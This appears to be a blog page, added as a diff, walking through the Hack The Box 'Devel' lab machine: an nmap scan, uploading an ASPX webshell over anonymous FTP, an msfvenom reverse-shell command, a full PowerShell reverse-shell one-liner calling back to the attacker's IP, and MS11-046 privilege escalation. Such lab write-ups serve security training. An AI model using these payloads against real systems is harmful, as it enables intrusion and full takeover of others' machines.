@@ -1,0 +1,418 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>nullarmor | Devel - Hack The Box</title>
+  <meta name="description" content="Resolution of the Devel machine">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="Devel - Hack The Box">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://nullarmor.github.io/posts/devel">
+  <meta property="og:description" content="Resolution of the Devel machine">
+  <meta property="og:site_name" content="nullarmor">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:url" content="https://nullarmor.github.io/posts/devel">
+  <meta name="twitter:title" content="Devel - Hack The Box">
+  <meta name="twitter:description" content="Resolution of the Devel machine">
+  <meta name="google-site-verification" content="1sfOj2zDu7c444806MBQqbqFzNWxik880zgryQLMj-o" />
+
+  
+    
+      <meta property="og:image" content="https://nullarmor.github.io/assets/hackthebox/devel/devel-00-994a3dea6facaa26c88e4425ba724cc3f74b3c0fa2cb0ab33705bbda362c884f.png">
+      <meta name="twitter:image" content="https://nullarmor.github.io/assets/hackthebox/devel/devel-00-994a3dea6facaa26c88e4425ba724cc3f74b3c0fa2cb0ab33705bbda362c884f.png">
+    
+  
+
+  <link href="https://nullarmor.github.io/feed.xml" type="application/rss+xml" rel="alternate" title="nullarmor Last 10 blog posts" />
+
+  
+
+  
+
+    
+      <link rel="icon" type="image/x-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="apple-touch-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
+      <link rel="stylesheet" type="text/css" title="light" id="light" href="/assets/light-fd3e34295723b96a04f635903b3650e5bb101ebdcc4d959165c3b4d2d88abe5e.css">
+      <link rel="stylesheet" type="text/css" title="dark" id="dark" href="/assets/dark-0f2545b8bdef934d32dd563b17074c614e7f4f4d5c3e682d4089a07fed36aa84.css" disabled="false">
+    
+
+  
+
+</head>
+
+<body>
+  <main>
+    <div class="grid grid-centered">
+      <div class="grid-cell">
+        <nav class="header-nav scrollappear">
+  <a href="/" class="header-logo" title="nullarmor">nullarmor</a>
+  <ul class="header-links">
+    
+      <li>
+        <a href="/about" title="About me">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
+  <use href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about" xlink:href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="https://twitter.com/nullarmor" rel="noreferrer noopener" target="_blank" title="Twitter">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-twitter">
+  <use href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter" xlink:href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+      <li>
+        <a href="https://github.com/nullarmor" rel="noreferrer noopener" target="_blank" title="GitHub">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
+  <use href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github" xlink:href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="https://www.linkedin.com/in/renan-almeida-8137a81a6" rel="noreferrer noopener" target="_blank" title="LinkedIn">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-linkedin">
+  <use href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin" xlink:href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="mailto:nullarmor@protonmail.com" title="Email">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-email">
+  <use href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email" xlink:href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+      <li>
+        <a onclick="toggle()" title="Toggle Theme">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-theme">
+  <use href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme" xlink:href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme"></use>
+</svg>
+
+        </a>
+      </li>
+    
+  </ul>
+</nav>
+
+
+  <ul class="header-tags scrollappear">
+    
+    
+      
+        <li><a href="/tag/ctf">Ctf</a></li>
+    
+      
+        <li><a href="/tag/cybrics">Cybrics</a></li>
+    
+      
+        <li><a href="/tag/hackthebox">Hackthebox</a></li>
+    
+      
+        <li><a href="/tag/hacktivitycon">Hacktivitycon</a></li>
+    
+      
+        <li><a href="/tag/pwn">Pwn</a></li>
+    
+      
+        <li><a href="/tag/rev">Rev</a></li>
+    
+      
+        <li><a href="/tag/rgbctf">Rgbctf</a></li>
+    
+      
+        <li><a href="/tag/web">Web</a></li>
+    
+  </ul>
+
+
+        <article class="article scrollappear">
+          <header class="article-header">
+            <h1>Devel - Hack The Box</h1>
+            <p>Resolution of the Devel machine</p>
+            <div class="article-list-footer">
+  <span class="article-list-date">
+    May 20, 2020
+  </span>
+  <span class="article-list-divider">-</span>
+  <span class="article-list-minutes">
+    
+    
+      5 minute read
+    
+  </span>
+  <span class="article-list-divider">-</span>
+  <div class="article-list-tags">
+    
+      
+      <a href="/tag/hackthebox" title="See all posts with tag 'HackTheBox'">HackTheBox</a>
+    
+  </div>
+</div>
+          </header>
+
+          <div class="article-content">
+            <p><a href="/assets/hackthebox/devel/devel-00-994a3dea6facaa26c88e4425ba724cc3f74b3c0fa2cb0ab33705bbda362c884f.png">
+  <img src="/assets/hackthebox/devel/devel-00-994a3dea6facaa26c88e4425ba724cc3f74b3c0fa2cb0ab33705bbda362c884f.png" alt="Popcorn banner" class="zooming" data-rjs="/assets/hackthebox/devel/devel-00-994a3dea6facaa26c88e4425ba724cc3f74b3c0fa2cb0ab33705bbda362c884f.png" data-zooming-width="597" data-zooming-height="380" />
+</a></p>
+
+<p>Devel is an easy level machine based on Windows, the initial approach is focused on <code class="highlighter-rouge">FTP server</code> that allow us to upload an <code class="highlighter-rouge">ASP webshell</code>. The privilege escalation stage is pretty easy with a few metasploit modules to help us.</p>
+
+<h1 id="recon">Recon</h1>
+
+<p>Starting with Nmap:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># Nmap 7.70 scan initiated Sun Jan 19 13:00:29 2020 as: nmap -sC -sV -oA devel -T4 -Pn 10.10.10.5</span>
+Nmap scan report <span class="k">for </span>10.10.10.5
+Host is up <span class="o">(</span>0.18s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 998 filtered ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+| 03-18-17  01:06AM       &lt;DIR&gt;          aspnet_client
+| 01-22-20  02:30PM                 2836 devel-test.aspx
+| 03-17-17  04:37PM                  689 iisstart.htm
+|_03-17-17  04:37PM               184946 welcome.png
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp open  http    Microsoft IIS httpd 7.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: IIS7
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Sun Jan 19 13:01:07 2020 -- 1 IP address (1 host up) scanned in 38.45 seconds</span></code></pre></figure>
+
+<p>The scan result show us two open ports, the first one is a <code class="highlighter-rouge">FTP server</code> and the last one is an <code class="highlighter-rouge">IIS 7 web server</code>.
+Digging the FTP server as anonymous user it’s possible to upload files to the server.</p>
+
+<p><a href="/assets/hackthebox/devel/devel-01-594e895eb54126c1bbe5c4b27488a29858fc898373e2e85343a249f7ff118372.png">
+  <img src="/assets/hackthebox/devel/devel-01-594e895eb54126c1bbe5c4b27488a29858fc898373e2e85343a249f7ff118372.png" alt="Devel Recon" class="zooming" data-rjs="/assets/hackthebox/devel/devel-01-594e895eb54126c1bbe5c4b27488a29858fc898373e2e85343a249f7ff118372.png" data-zooming-width="504" data-zooming-height="286" />
+</a></p>
+
+<p>The web server has the default IIS 7 page:</p>
+
+<p><a href="/assets/hackthebox/devel/devel-02-c3aded499880ce99f6803221b47ec17dd5bb4a8f6338db18bac20f383f4d7c27.png">
+  <img src="/assets/hackthebox/devel/devel-02-c3aded499880ce99f6803221b47ec17dd5bb4a8f6338db18bac20f383f4d7c27.png" alt="Devel Recon" class="zooming" data-rjs="/assets/hackthebox/devel/devel-02-c3aded499880ce99f6803221b47ec17dd5bb4a8f6338db18bac20f383f4d7c27.png" data-zooming-width="999" data-zooming-height="479" />
+</a></p>
+
+<h1 id="exploiting---uploading-an-aspx-webshell-to-the-server-metasploit-method">Exploiting - Uploading an ASPX webshell to the server (metasploit method)</h1>
+
+<p>Knowing that we’re able to upload any file to the server through FTP service, we can exploit the server uploading an ASPX webshell.
+To do it with metasploit, just generate a malicious .aspx meterpreter stager to give us a reverse shell:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">msfvenom <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.10 <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nt">-f</span> aspx <span class="o">&gt;</span> exploit.aspx</code></pre></figure>
+
+<p>After that let’s upload the malicious ASPX file to the server through FTP server:</p>
+
+<p><a href="/assets/hackthebox/devel/devel-03-79ab843baad387d43f93945344b95684986d9a42c818c4ec97c9b3e58ef06141.png">
+  <img src="/assets/hackthebox/devel/devel-03-79ab843baad387d43f93945344b95684986d9a42c818c4ec97c9b3e58ef06141.png" alt="Devel Exploiting" class="zooming" data-rjs="/assets/hackthebox/devel/devel-03-79ab843baad387d43f93945344b95684986d9a42c818c4ec97c9b3e58ef06141.png" data-zooming-width="501" data-zooming-height="258" />
+</a></p>
+
+<p>Now we set up the metasploit listener to catch our reverse shell using a Windows meterpreter payload, after that we need to access the URL where our .aspx file is located to trigger the exploit:</p>
+
+<p><a href="/assets/hackthebox/devel/devel-04-81e53938cf91459e505c3083e1410d9751f1b13cc7f273684f35c0ad23fcfed2.png">
+  <img src="/assets/hackthebox/devel/devel-04-81e53938cf91459e505c3083e1410d9751f1b13cc7f273684f35c0ad23fcfed2.png" alt="Devel Exploiting" class="zooming" data-rjs="/assets/hackthebox/devel/devel-04-81e53938cf91459e505c3083e1410d9751f1b13cc7f273684f35c0ad23fcfed2.png" data-zooming-width="742" data-zooming-height="387" />
+</a></p>
+
+<p>Inside the system as <code class="highlighter-rouge">IIS APPOOL\Web</code> is a bad thing because we have limited rights on the system.
+We need to escalate privileges to be able to read the user and root flags.</p>
+
+<h1 id="exploiting---uploading-an-aspx-webshell-to-the-server-manual-method-w-powershell">Exploiting - Uploading an ASPX webshell to the server (manual method w/ Powershell)</h1>
+
+<p>This method, different from the metasploit, consists of a different ASPX webshell to get the reverse shell.
+The webshell that will be used is located at <code class="highlighter-rouge">/usr/share/webshells/aspx/cmdasp.aspx</code> and will be uploaded through FTP:</p>
+
+<p><a href="/assets/hackthebox/devel/devel-05-740d3ccbbbf043a4ee3b34f0117ed88875a9803517ad065c84211c33d1ff9f46.png">
+  <img src="/assets/hackthebox/devel/devel-05-740d3ccbbbf043a4ee3b34f0117ed88875a9803517ad065c84211c33d1ff9f46.png" alt="Devel Exploiting" class="zooming" data-rjs="/assets/hackthebox/devel/devel-05-740d3ccbbbf043a4ee3b34f0117ed88875a9803517ad065c84211c33d1ff9f46.png" data-zooming-width="1011" data-zooming-height="214" />
+</a></p>
+
+<p>The server has Powershell so all we need to do is send a malicious Powershell reverse shell stager through the webshell input:</p>
+
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="nf">powershell</span><span class="w"> </span><span class="nt">-nop</span><span class="w"> </span><span class="nt">-exec</span><span class="w"> </span><span class="nx">bypass</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"</span><span class="nv">$client</span><span class="s2"> = New-Object System.Net.Sockets.TCPClient('10.10.14.10',4444);</span><span class="nv">$stream</span><span class="s2"> = </span><span class="nv">$client</span><span class="s2">.GetStream();[byte[]]</span><span class="nv">$bytes</span><span class="s2"> = 0..65535|%{0};while((</span><span class="nv">$i</span><span class="s2"> = </span><span class="nv">$stream</span><span class="s2">.Read(</span><span class="nv">$bytes</span><span class="s2">, 0, </span><span class="nv">$bytes</span><span class="s2">.Length)) -ne 0){;</span><span class="nv">$data</span><span class="s2"> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(</span><span class="nv">$bytes</span><span class="s2">,0, </span><span class="nv">$i</span><span class="s2">);</span><span class="nv">$sendback</span><span class="s2"> = (iex </span><span class="nv">$data</span><span class="s2"> 2&gt;&amp;1 | Out-String );</span><span class="nv">$sendback2</span><span class="s2"> = </span><span class="nv">$sendback</span><span class="s2"> + 'PS ' + (pwd).Path + '&gt; ';</span><span class="nv">$sendbyte</span><span class="s2"> = ([text.encoding]::ASCII).GetBytes(</span><span class="nv">$sendback2</span><span class="s2">);</span><span class="nv">$stream</span><span class="s2">.Write(</span><span class="nv">$sendbyte</span><span class="s2">,0,</span><span class="nv">$sendbyte</span><span class="s2">.Length);</span><span class="nv">$stream</span><span class="s2">.Flush()};</span><span class="nv">$client</span><span class="s2">.Close()"</span></code></pre></figure>
+
+<p>Now we set up the netcat on listening mode and reverse shell connection is established in seconds :)</p>
+
+<p><a href="/assets/hackthebox/devel/devel-06-68e4fcba48245b3654a01c0536adb0cbb930218a8e5845732196fda482540f57.png">
+  <img src="/assets/hackthebox/devel/devel-06-68e4fcba48245b3654a01c0536adb0cbb930218a8e5845732196fda482540f57.png" alt="Devel Exploiting" class="zooming" data-rjs="/assets/hackthebox/devel/devel-06-68e4fcba48245b3654a01c0536adb0cbb930218a8e5845732196fda482540f57.png" data-zooming-width="428" data-zooming-height="94" />
+</a></p>
+
+<h1 id="post-exploitation---using-a-metasploit-module-to-escalate-privileges-metasploit-method">Post Exploitation - Using a metasploit module to escalate privileges (metasploit method)</h1>
+
+<p>Running the metasploit module called <code class="highlighter-rouge">post/multi/recon/local_exploit_suggester</code> we get some exploit suggestions:</p>
+
+<p><a href="/assets/hackthebox/devel/devel-07-20fe384b84c6b6cdf8b6a19624b9ce283a20a1206ad0ff75d76280201aa558d7.png">
+  <img src="/assets/hackthebox/devel/devel-07-20fe384b84c6b6cdf8b6a19624b9ce283a20a1206ad0ff75d76280201aa558d7.png" alt="Devel Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/devel/devel-07-20fe384b84c6b6cdf8b6a19624b9ce283a20a1206ad0ff75d76280201aa558d7.png" data-zooming-width="980" data-zooming-height="257" />
+</a></p>
+
+<p>After that we can test some exploits, the exploit called <code class="highlighter-rouge">ms10_015_kitrap0d</code> that works with DLL process injection seems to be effective and a meterpreter session is oppened gaving us SYSTEM privileges.</p>
+
+<p><a href="/assets/hackthebox/devel/devel-08-8257b78b84fdd681c526efb668a62d3efbac34fb07d9ee13d84d9ec022867550.png">
+  <img src="/assets/hackthebox/devel/devel-08-8257b78b84fdd681c526efb668a62d3efbac34fb07d9ee13d84d9ec022867550.png" alt="Devel Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/devel/devel-08-8257b78b84fdd681c526efb668a62d3efbac34fb07d9ee13d84d9ec022867550.png" data-zooming-width="719" data-zooming-height="496" />
+</a></p>
+
+<h1 id="post-exploitation---using-a-metasploit-module-to-escalate-privileges-metasploit-method--manual-method">Post Exploitation - Using a metasploit module to escalate privileges (metasploit method + manual method)</h1>
+
+<p>In this method we’re going to upload a malicious executable file that is compiled to run on Windows.
+The first step is getting the source code of the exploit that exploits the vulnerability <code class="highlighter-rouge">MS11-046</code>:</p>
+
+<p><a href="https://raw.githubusercontent.com/abatchy17/WindowsExploits/master/MS11-046/40564.c" target="_blank">MS11-046 Source Code</a></p>
+
+<p>This vulnerability is found on Ancillary Function Driver (AFD), on the user level to kernel level way.</p>
+
+<p>We compile the exploit using a special gcc called <code class="highlighter-rouge">i686-w64-mingw32-gcc</code> to generate an suitable executable to Windows machines:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">i686-w64-mingw32-gcc 40564.c <span class="nt">-o</span> 40564.exe <span class="nt">-lws2_32</span></code></pre></figure>
+
+<p>After that we send our compiled exploit to the machine through FTP in <code class="highlighter-rouge">binary mode</code> and execute using the metasploit session shell:</p>
+
+<p><a href="/assets/hackthebox/devel/devel-09-a16ea7d031fc9d7d56e11db2d10ccca48751127fb8aa0f81943f84038cbb25ce.png">
+  <img src="/assets/hackthebox/devel/devel-09-a16ea7d031fc9d7d56e11db2d10ccca48751127fb8aa0f81943f84038cbb25ce.png" alt="Devel Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/devel/devel-09-a16ea7d031fc9d7d56e11db2d10ccca48751127fb8aa0f81943f84038cbb25ce.png" data-zooming-width="504" data-zooming-height="259" />
+</a></p>
+
+<p><a href="/assets/hackthebox/devel/devel-10-107da86294923d19cbd743bfe377eb7935853e38fae76cffbc14067448d68926.png">
+  <img src="/assets/hackthebox/devel/devel-10-107da86294923d19cbd743bfe377eb7935853e38fae76cffbc14067448d68926.png" alt="Devel Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/devel/devel-10-107da86294923d19cbd743bfe377eb7935853e38fae76cffbc14067448d68926.png" data-zooming-width="470" data-zooming-height="347" />
+</a></p>
+
+<h1 id="post-exploitation---escalating-privileges-without-metasploit">Post Exploitation - Escalating privileges without metasploit</h1>
+
+<p>In this method the whole process is manual, without any metasploit help.
+To begin with, we need to download a modified version of the exploit based on the vulnerability <code class="highlighter-rouge">MS11-046</code> that I made. I removed a small section from the original code and added a Powershell payload to our reverse shell connection:</p>
+
+<p><a href="https://gist.github.com/nullarmor/f57e0cd65824979422bff22b3408c6d7" target="_blank"> Windows x86 (Devel suitable version) AFD privilege escalation (MS11-046) modified by nullarmor </a></p>
+
+<blockquote>
+  <p>Replace <code class="highlighter-rouge">('10.10.14.10',4445)</code> with your IP and port.</p>
+</blockquote>
+
+<p>Let’s save, compile using <code class="highlighter-rouge">i686-w64-mingw32-gcc</code> and upload through FTP server.</p>
+
+<p>After that we set up the netcat on listening mode, on the first reverse shell session that we got from manual ASPX webshell the compiled exploit will be executed, resulting in a second reverse shell with <code class="highlighter-rouge">NT AUTHORITY\SYSTEM</code> privileges :)</p>
+
+<p><a href="/assets/hackthebox/devel/devel-11-08660b633adf4b911c2f53dfac051076c4189463fe6b579906c1a439ccdc60ee.png">
+  <img src="/assets/hackthebox/devel/devel-11-08660b633adf4b911c2f53dfac051076c4189463fe6b579906c1a439ccdc60ee.png" alt="Devel Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/devel/devel-11-08660b633adf4b911c2f53dfac051076c4189463fe6b579906c1a439ccdc60ee.png" data-zooming-width="868" data-zooming-height="156" />
+</a></p>
+
+<h1 id="exploiting--post-exploiting---using-a-custom-exploit">Exploiting + Post Exploiting - Using a custom exploit</h1>
+
+<p>For knowledge purposes I made a custom exploit that exploits and escalate the privileges on the Devel machine, spawning an interactive reverse shell to us, it’s available on my GitHub :)</p>
+
+<p><a href="https://github.com/nullarmor/hackthebox-exploits/tree/master/devel" target="_blank">Devel Exploit + Privilege Escalation</a></p>
+
+<p>The bellow exploit has the following functions:</p>
+
+<ul>
+  <li>Modified C exploit download and compilation</li>
+  <li>ASPX webshell builder</li>
+  <li>Modified exploit and ASPX webshell upload through FTP</li>
+  <li>Interactive shell spawning</li>
+  <li>Privilege escalation auto-trigger</li>
+</ul>
+
+<p><a href="/assets/hackthebox/devel/devel-12-5feef0cebdbda4747b62e42f55131e809c961b25159fab6bf1564fdf183bbfec.png">
+  <img src="/assets/hackthebox/devel/devel-12-5feef0cebdbda4747b62e42f55131e809c961b25159fab6bf1564fdf183bbfec.png" alt="Devel Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/devel/devel-12-5feef0cebdbda4747b62e42f55131e809c961b25159fab6bf1564fdf183bbfec.png" data-zooming-width="647" data-zooming-height="407" />
+</a></p>
+
+<p>After both flags can be obtained!</p>
+
+<p><a href="/assets/hackthebox/devel/devel-13-2766ee5d6cb476959dbdb7815c751c6cc8d38a96cda2e610def7d57c575e4841.png">
+  <img src="/assets/hackthebox/devel/devel-13-2766ee5d6cb476959dbdb7815c751c6cc8d38a96cda2e610def7d57c575e4841.png" alt="Devel Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/devel/devel-13-2766ee5d6cb476959dbdb7815c751c6cc8d38a96cda2e610def7d57c575e4841.png" data-zooming-width="328" data-zooming-height="26" />
+</a></p>
+
+<p><a href="/assets/hackthebox/devel/devel-14-d93030d6352fff7c15ef076d01f0abb4962011d5d5b72e634dbc29678aa574f6.png">
+  <img src="/assets/hackthebox/devel/devel-14-d93030d6352fff7c15ef076d01f0abb4962011d5d5b72e634dbc29678aa574f6.png" alt="Devel Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/devel/devel-14-d93030d6352fff7c15ef076d01f0abb4962011d5d5b72e634dbc29678aa574f6.png" data-zooming-width="388" data-zooming-height="26" />
+</a></p>
+
+          </div>
+          <div class="article-share">
+            
+            
+            <a href="https://twitter.com/home?status=Devel+-+Hack+The+Box%20-%20https://nullarmor.github.io/posts/devel%20by%20@nullarmor" title="Share on Twitter" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"/></svg>
+            </a>
+            <a href="https://www.facebook.com/sharer/sharer.php?u=https://nullarmor.github.io/posts/devel" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"/></svg>
+            </a>
+          </div>
+
+          
+            <div id="disqus_thread" class="article-comments"></div>
+            <script src="https://nullarmor.disqus.com/embed.js" async defer></script>
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+          
+        </article>
+        <footer class="footer scrollappear">
+  <p>
+    This site uses Chalk theme made by Nielsen Ramon.
+  </p>
+</footer>
+
+      </div>
+    </div>
+  </main>
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-159304176-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-159304176-1');
+  </script>
+
+
+<script type="text/javascript" src="/assets/vendor-2c224c53eb697c739f9490c38819a72184f09472739fd9e492272ef174090428.js"></script>
+
+
+  <script type="text/javascript" src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js"></script>
+
+
+
+  <script type="text/javascript" src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js"></script>
+
+
+<script type="text/javascript" src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js"></script>
+
+
+  <script type="text/javascript" src="/assets/themetoggle-df0d3d73164dc26dffbd630182ae4d0dfa7bee6b694a2b5d565d73595b582bbf.js"></script>
+
+</body>
+</html>
